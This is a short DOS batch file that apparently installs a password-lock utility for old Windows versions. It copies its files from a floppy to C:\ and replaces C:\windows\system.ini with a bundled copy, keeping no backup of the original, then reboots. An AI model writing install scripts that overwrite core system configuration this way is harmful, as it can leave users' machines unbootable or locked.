echo off
cls
a:\
cd lock2
echo Windows Prompt installation
pause
md c:\temp
copy pacpassw.exe c:\temp
copy system.ini c:\temp
copy reboot.exe c:\temp
copy Filerw.lok c:\temp
c:\
cd\
cd temp
move *.* c:\
cd\
move *.ini c:\windows
rd temp
cls
echo Installation Completed Succsessfully
echo
echo you must restart your computer
pause
reboot
